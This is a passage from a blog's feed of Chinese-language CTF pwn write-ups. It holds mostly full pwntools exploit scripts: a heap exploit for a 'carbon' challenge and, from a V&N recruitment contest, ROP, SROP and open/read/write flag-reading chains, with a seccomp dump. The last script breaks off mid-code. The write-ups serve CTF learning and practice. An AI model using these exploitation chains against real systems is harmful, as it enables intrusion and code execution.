class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N招新赛writeup</title>
    <link href="https://nocbtm.github.io/2020/03/02/V&amp;N%E6%8B%9B%E6%96%B0%E8%B5%9Bwriteup/"/>
    <id>https://nocbtm.github.io/2020/03/02/V&amp;N招新赛writeup/</id>
    <published>2020-03-02T08:47:00.000Z</published>
    <updated>2020-04-23T04:00:50.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V-amp-N招新赛writeup"><a href="#V-amp-N招新赛writeup" class="headerlink" title="V&amp;N招新赛writeup"></a>V&amp;N招新赛writeup</h1><p>参考链接:<a href="https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/" target="_blank" rel="noopener">https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/</a></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>题目首先给了puts函数的地址，可得出libc基址，比赛的时候老想着用栈迁移，但stack_addr是随机的，难度比较大。赛后看了小蓝师傅的博客，又学到了新姿势，返回地址覆盖成ret之后，执行两次ret，刚好返回到第一次输入的地方。然后进行ROP，这题用了prtctl函数把execve禁了，可以用open(flag),read(flag,libc_addr+0x3C6500,0x40),write(1,flag,0x40)获取到flag</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52275</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"gift: 0x"</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">info(hex(puts_addr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc_addr=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(hex(libc_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Input something: '</span>)</span><br><span class="line">pop_rdi=<span class="number">0x21102</span></span><br><span class="line">pop_rsi=<span class="number">0x202e8</span></span><br><span class="line">pop_rax=<span class="number">0x33544</span></span><br><span class="line">pop_rdx=<span class="number">0x1b92</span></span><br><span class="line">syscall_ret=<span class="number">0xbc375</span></span><br><span class="line">ret=<span class="number">0x937</span></span><br><span class="line">payload = p64(libc_addr+pop_rdi)+p64(<span class="number">0</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">'open'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">3</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">1</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'write'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(libc_addr+ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'flag\x00\x00\n'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>SROP参考:<a href="https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop</a><br>这道题还是借鉴小蓝师傅的做法<br>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./vn_pwn_babypwn_1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0d</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000031</span>  <span class="keyword">if</span> (A == bind) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000032</span>  <span class="keyword">if</span> (A == listen) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000038</span>  <span class="keyword">if</span> (A == clone) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000039</span>  <span class="keyword">if</span> (A == fork) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        return_address=u32(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">4</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    log.success(info+str(hex(return_address+offset)))</span><br><span class="line">    <span class="keyword">return</span> return_address+offset</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span><span class="params">(sh)</span>:</span></span><br><span class="line">    sh.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">return</span> sh.recvrepeat(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_gdb</span><span class="params">(sh,stop=False)</span>:</span></span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    <span class="keyword">if</span> stop :</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    sh = get_sh()</span><br><span class="line">    get_gdb(sh)</span><br><span class="line">    libc.address = get_address(sh,<span class="string">'The libc base address is '</span>,<span class="string">'Here is my gift: 0x'</span>,<span class="string">'\n'</span>,-libc.symbols[<span class="string">'puts'</span>],<span class="keyword">True</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">'Please input magic message: '</span>)</span><br><span class="line">    fake_frame  = p64(<span class="number">0</span>) * <span class="number">12</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RDI = RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RSI = RDI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RBX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)          <span class="comment"># RDX = RSI</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># RAX</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x100</span>)                                   <span class="comment"># RCX = RDX</span></span><br><span class="line">    fake_frame += p64(libc.address + <span class="number">0x3C6500</span>)                 <span class="comment"># RSP</span></span><br><span class="line">    fake_frame += p64(libc.symbols[<span class="string">'syscall'</span>])                 <span class="comment"># RIP</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>)                                       <span class="comment"># eflags</span></span><br><span class="line">    fake_frame += p64(<span class="number">0x33</span>)                                    <span class="comment"># cs : gs : fs</span></span><br><span class="line">    fake_frame += p64(<span class="number">0</span>) * <span class="number">7</span></span><br><span class="line">    <span class="comment"># get_gdb(sh)</span></span><br><span class="line">    sh.send(fake_frame)</span><br><span class="line">    ROP_chain  = <span class="string">'/flag\x00\x00\x00'</span></span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6500</span> - <span class="number">0x10</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'open'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">3</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'read'</span>])</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000021102</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">1</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x00000000000202e8</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x3C6700</span>)</span><br><span class="line">    ROP_chain += p64(libc.address + <span class="number">0x0000000000001b92</span>)</span><br><span class="line">    ROP_chain += p64(<span class="number">0x100</span>)</span><br><span class="line">    ROP_chain += p64(libc.symbols[<span class="string">'write'</span>])</span><br><span class="line">    <span class="comment">#raw_input('&gt;')</span></span><br><span class="line">    sh.send(ROP_chain)</span><br><span class="line">    <span class="keyword">print</span> sh.recv()</span><br></pre></td></tr></table></figure><h2 id="simpleHeap"><a href="#simpleHeap" class="headerlink" title="simpleHeap"></a>simpleHeap</h2><p>off-by-one漏洞，利用堆块重叠修改下一个堆块的size，造成overlap，可leak出libc_addr,再利用overlap进行fastbin attack，修改malloc_hook为one_gadget。但是此处所有的one_gadget条件均不满足，因此需要利用realloc函数调整栈帧。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span 